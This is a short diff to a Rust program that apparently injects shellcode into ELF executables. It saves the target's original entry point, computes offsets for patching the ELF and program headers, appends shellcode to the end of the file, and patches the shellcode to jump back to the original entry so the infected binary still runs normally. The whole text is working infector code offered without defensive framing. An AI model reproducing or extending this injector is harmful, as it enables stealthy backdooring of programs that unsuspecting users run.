@@ -30,6 +30,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         elf_header.e_phnum,
     )?;
 
+    // Save the old entry point so we can add a jump later
+    let original_entry = elf_header.e_entry;
+
     // Calculate offsets used to patch the ELF and program headers
     let sc_len = shellcode.len() as u64;
     let file_offset = elf_fd.metadata()?.len();
@@ -53,8 +56,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     // Patch the shellcode to jump to the original entry point after finishing
-    let start_offset = 0x7490; // This should be parsed by mental_elf
-    patch_jump(&mut shellcode, elf_header.e_entry, start_offset);
+    patch_jump(&mut shellcode, elf_header.e_entry, original_entry);
 
     // Append the shellcode to the very end of the target ELF
     elf_fd.seek(SeekFrom::End(0))?;
